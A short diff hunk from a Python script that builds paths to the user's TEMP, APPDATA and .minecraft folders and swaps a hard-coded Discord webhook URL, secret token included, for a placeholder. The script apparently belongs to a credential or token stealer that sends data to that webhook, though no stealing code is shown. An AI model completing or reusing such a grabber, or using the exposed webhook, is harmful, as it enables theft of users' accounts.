@@ -25,7 +25,7 @@ TEMP = os.getenv("TEMP")
 ROAMING = os.getenv("APPDATA")
 mcpath = ROAMING + "\\.minecraft"
 
-webhookurl = "https://discord.com/api/webhooks/867839878560350278/ODMGlHpxcZJiT1BykvufXogeTJ7vibHt6htST0tXqqb2sNgoKYvfiS72RPmh8xJt-lri"
+webhookurl = "YOUR_TOKEN"
 
 PATHS = {
 
